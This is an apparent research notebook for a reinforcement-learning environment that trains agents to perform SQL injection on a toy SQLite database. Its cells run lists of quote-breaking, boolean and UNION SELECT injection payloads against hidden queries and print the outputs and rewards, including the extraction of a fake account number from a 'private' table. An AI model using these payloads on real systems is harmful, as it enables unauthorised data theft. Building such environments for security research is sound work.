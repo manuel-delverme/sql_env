{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "c9eda635",
   "metadata": {},
   "outputs": [],
   "source": [
    "import numpy as np\n",
    "from IPython.display import clear_output, display\n",
    "from tqdm import tqdm\n",
    "import environment\n",
    "import gym\n",
    "import structured.generate_actions as gen_acts"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "decf8eb8",
   "metadata": {},
   "outputs": [],
   "source": [
    "env = gym.make('SQL-v1')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "e5b0b4a9",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "''"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "actions = gen_acts.generate_actions()\n",
    "env.reset()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "2e48d841",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "SELECT id, username, firstname FROM users WHERE age=33{input}\n",
      "('5;123;Bob;', -0.1) |||| SELECT id, username, firstname FROM users WHERE age=33\n",
      "('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33' and 1=1 --\n",
      "('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33' and 1=2 --\n",
      "('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33' union select NULL --\n",
      "('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33' union select NULL, NULL --\n",
      "('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33' union select NULL, NULL, NULL --\n",
      "('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33' union select NULL, NULL, NULL, NULL --\n",
      "('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33' union select NULL, NULL, NULL, NULL, NULL --\n",
      "('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33' union select account from private --\n",
      "('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33' union select account, NULL from private --\n",
      "('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33' union select account, NULL, NULL from private --\n",
      "('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33' union select account, NULL, NULL, NULL from private --\n",
      "('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33' union select account, NULL, NULL, NULL, NULL from private --\n",
      "('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33\" and 1=1 --\n",
      "('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33\" and 1=2 --\n",
      "('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33\" union select NULL --\n",
      "('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33\" union select NULL, NULL --\n",
      "('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33\" union select NULL, NULL, NULL --\n",
      "('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33\" union select NULL, NULL, NULL, NULL --\n",
      "('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33\" union select NULL, NULL, NULL, NULL, NULL --\n",
      "('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33\" union select account from private --\n",
      "('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33\" union select account, NULL from private --\n",
      "('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33\" union select account, NULL, NULL from private --\n",
      "('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33\" union select account, NULL, NULL, NULL from private --\n",
      "('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33\" union select account, NULL, NULL, NULL, NULL from private --\n",
      "('5;123;Bob;', -0.1) |||| SELECT id, username, firstname FROM users WHERE age=33 and 1=1 --\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE age=33 and 1=2 --\n",
      "('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33 union select NULL --\n",
      "('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33 union select NULL, NULL --\n",
      "('None;None;None;5;123;Bob;', -0.1) |||| SELECT id, username, firstname FROM users WHERE age=33 union select NULL, NULL, NULL --\n",
      "('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33 union select NULL, NULL, NULL, NULL --\n",
      "('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33 union select NULL, NULL, NULL, NULL, NULL --\n",
      "('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33 union select account from private --\n",
      "('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33 union select account, NULL from private --\n",
      "('5;123;Bob;accountnr:123456;None;None;', 99.9) |||| SELECT id, username, firstname FROM users WHERE age=33 union select account, NULL, NULL from private --\n",
      "('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33 union select account, NULL, NULL, NULL from private --\n",
      "('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33 union select account, NULL, NULL, NULL, NULL from private --\n"
     ]
    }
   ],
   "source": [
    "print(env.hidden_query)\n",
    "for action in actions:\n",
    "    #print(env.step(action)[1],\"||||\", env.hidden_query.format(input = action))\n",
    "    print(env.step(action)[:2],\"||||\", env.hidden_query.format(input = action))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "5820222f",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "SELECT id FROM users WHERE age=33{input}\n",
      "('5;', -0.1) |||| SELECT id FROM users WHERE age=33\n",
      "('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33' and 1=1 --\n",
      "('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33' and 1=2 --\n",
      "('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33' union select NULL --\n",
      "('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33' union select NULL, NULL --\n",
      "('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33' union select NULL, NULL, NULL --\n",
      "('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33' union select NULL, NULL, NULL, NULL --\n",
      "('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33' union select NULL, NULL, NULL, NULL, NULL --\n",
      "('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33' union select account from private --\n",
      "('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33' union select account, NULL from private --\n",
      "('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33' union select account, NULL, NULL from private --\n",
      "('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33' union select account, NULL, NULL, NULL from private --\n",
      "('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33' union select account, NULL, NULL, NULL, NULL from private --\n",
      "('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33\" and 1=1 --\n",
      "('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33\" and 1=2 --\n",
      "('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33\" union select NULL --\n",
      "('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33\" union select NULL, NULL --\n",
      "('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33\" union select NULL, NULL, NULL --\n",
      "('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33\" union select NULL, NULL, NULL, NULL --\n",
      "('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33\" union select NULL, NULL, NULL, NULL, NULL --\n",
      "('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33\" union select account from private --\n",
      "('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33\" union select account, NULL from private --\n",
      "('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33\" union select account, NULL, NULL from private --\n",
      "('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33\" union select account, NULL, NULL, NULL from private --\n",
      "('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33\" union select account, NULL, NULL, NULL, NULL from private --\n",
      "('5;', -0.1) |||| SELECT id FROM users WHERE age=33 and 1=1 --\n",
      "('', -0.1) |||| SELECT id FROM users WHERE age=33 and 1=2 --\n",
      "('None;5;', -0.1) |||| SELECT id FROM users WHERE age=33 union select NULL --\n",
      "('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33 union select NULL, NULL --\n",
      "('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33 union select NULL, NULL, NULL --\n",
      "('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33 union select NULL, NULL, NULL, NULL --\n",
      "('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33 union select NULL, NULL, NULL, NULL, NULL --\n",
      "('5;accountnr:123456;', 99.9) |||| SELECT id FROM users WHERE age=33 union select account from private --\n",
      "('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33 union select account, NULL from private --\n",
      "('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33 union select account, NULL, NULL from private --\n",
      "('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33 union select account, NULL, NULL, NULL from private --\n",
      "('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33 union select account, NULL, NULL, NULL, NULL from private --\n"
     ]
    }
   ],
   "source": [
    "env.reset()\n",
    "print(env.hidden_query)\n",
    "for action in actions:\n",
    "    #print(env.step(action)[1],\"||||\", env.hidden_query.format(input = action))\n",
    "    print(env.step(action)[:2],\"||||\", env.hidden_query.format(input = action))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "3b71c724",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "SELECT id FROM users WHERE firstname='Bob{input}'\n",
      "('5;', -0.1) |||| \n",
      "('5;', -0.1) |||| ' and 1=1 --\n",
      "('', -0.1) |||| ' and 1=2 --\n",
      "('None;5;', -0.1) |||| ' union select NULL --\n",
      "('ERROR', -1.0) |||| ' union select NULL, NULL --\n",
      "('ERROR', -1.0) |||| ' union select NULL, NULL, NULL --\n",
      "('ERROR', -1.0) |||| ' union select NULL, NULL, NULL, NULL --\n",
      "('ERROR', -1.0) |||| ' union select NULL, NULL, NULL, NULL, NULL --\n",
      "('5;accountnr:123456;', 99.9) |||| ' union select account from private --\n",
      "('ERROR', -1.0) |||| ' union select account, NULL from private --\n",
      "('ERROR', -1.0) |||| ' union select account, NULL, NULL from private --\n",
      "('ERROR', -1.0) |||| ' union select account, NULL, NULL, NULL from private --\n",
      "('ERROR', -1.0) |||| ' union select account, NULL, NULL, NULL, NULL from private --\n",
      "('', -0.1) |||| \" and 1=1 --\n",
      "('', -0.1) |||| \" and 1=2 --\n",
      "('', -0.1) |||| \" union select NULL --\n",
      "('', -0.1) |||| \" union select NULL, NULL --\n",
      "('', -0.1) |||| \" union select NULL, NULL, NULL --\n",
      "('', -0.1) |||| \" union select NULL, NULL, NULL, NULL --\n",
      "('', -0.1) |||| \" union select NULL, NULL, NULL, NULL, NULL --\n",
      "('', -0.1) |||| \" union select account from private --\n",
      "('', -0.1) |||| \" union select account, NULL from private --\n",
      "('', -0.1) |||| \" union select account, NULL, NULL from private --\n",
      "('', -0.1) |||| \" union select account, NULL, NULL, NULL from private --\n",
      "('', -0.1) |||| \" union select account, NULL, NULL, NULL, NULL from private --\n",
      "('', -0.1) ||||  and 1=1 --\n",
      "('', -0.1) ||||  and 1=2 --\n",
      "('', -0.1) ||||  union select NULL --\n",
      "('', -0.1) ||||  union select NULL, NULL --\n",
      "('', -0.1) ||||  union select NULL, NULL, NULL --\n",
      "('', -0.1) ||||  union select NULL, NULL, NULL, NULL --\n",
      "('', -0.1) ||||  union select NULL, NULL, NULL, NULL, NULL --\n",
      "('', -0.1) ||||  union select account from private --\n",
      "('', -0.1) ||||  union select account, NULL from private --\n",
      "('', -0.1) ||||  union select account, NULL, NULL from private --\n",
      "('', -0.1) ||||  union select account, NULL, NULL, NULL from private --\n",
      "('', -0.1) ||||  union select account, NULL, NULL, NULL, NULL from private --\n"
     ]
    }
   ],
   "source": [
    "env.reset()\n",
    "print(env.hidden_query)\n",
    "for action in actions:\n",
    "    #print(env.step(action)[1],\"||||\", env.hidden_query.format(input = action))\n",
    "    print(env.step(action)[:2],\"||||\", action)\n",
    "    #print(env.step(action)[:2],\"||||\", env.hidden_query.format(input = action))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "id": "47af2689",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[(1,), (2,), (3,), (4,), (5,)]"
      ]
     },
     "execution_count": 18,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "env.cursor.execute(env.hidden_query.replace(\"Bob\",\"\").format(input = \"1' or 1=1 --\"))\n",
    "env.cursor.fetchall()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "id": "91e48ba9",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[]"
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "env.step(env.hidden_query.replace(\"Bob\",\"\").format(input = \"1' or 1=2 --\"))\n",
    "env.cursor.fetchall()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "6163eb2d",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[(1, 'admin', 'admin', 'admin', 78, 'IT', '1994-11-02'),\n",
       " (2, 'dricci', 'dian', 'ricci', 12345, 'AI', '2021-02-02'),\n",
       " (3, 'amason', 'anthony', 'mason', 45, 'Middle earth', '1301-02-02'),\n",
       " (4, 'svargas', 'sandra', 'vargas', 19, 'Earth', '2040-01-01'),\n",
       " (5, '123', 'Bob', '123', 33, 'TI', '3011-01-01')]"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "env.cursor.execute(\"select * from users\")\n",
    "env.cursor.fetchall()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "5ff7d364",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[(0, 'id', 'INTEGER', 0, None, 1),\n",
       " (1, 'username', 'TEXT', 0, None, 0),\n",
       " (2, 'firstname', 'TEXT', 0, None, 0),\n",
       " (3, 'surname', 'TEXT', 0, None, 0),\n",
       " (4, 'age', 'INT', 0, None, 0),\n",
       " (5, 'nationality', 'TEXT', 0, None, 0),\n",
       " (6, 'created_at', 'TEXT', 0, None, 0)]"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "env.cursor.execute('PRAGMA TABLE_INFO(users)')\n",
    "env.cursor.fetchall()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "c8bf4f8f",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[(0, 'id', 'INTEGER', 0, None, 1),\n",
       " (1, 'userid', 'INT', 0, None, 0),\n",
       " (2, 'account', 'TEXT', 0, None, 0)]"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "env.cursor.execute('PRAGMA TABLE_INFO(PRIVATE)')\n",
    "env.cursor.fetchall()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "3216d91d",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[(1, 1, 'accountnr:123456')]"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "env.cursor.execute(\"select * from PRIVATE\")\n",
    "env.cursor.fetchall()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "id": "fd15cd52",
   "metadata": {},
   "outputs": [
    {
     "ename": "OperationalError",
     "evalue": "near \"and\": syntax error",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mOperationalError\u001b[0m                          Traceback (most recent call last)",
      "\u001b[1;32m<ipython-input-24-138c5785a79e>\u001b[0m in \u001b[0;36m<module>\u001b[1;34m\u001b[0m\n\u001b[0;32m      1\u001b[0m \u001b[1;31m#env.cursor.execute(\"SELECT id FROM users WHERE age= and 1=1 --\")\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m----> 2\u001b[1;33m \u001b[0menv\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mcursor\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mexecute\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;34m\"SELECT id FROM users WHERE age= and 1=1 --\"\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m      3\u001b[0m \u001b[0menv\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mcursor\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mfetchall\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;31mOperationalError\u001b[0m: near \"and\": syntax error"
     ]
    }
   ],
   "source": [
    "#env.cursor.execute(\"SELECT id FROM users WHERE age= and 1=1 --\")\n",
    "env.cursor.execute(\"SELECT id FROM users WHERE age= and 1=1 --\")\n",
    "env.cursor.fetchall()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c46b3e24",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.8"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
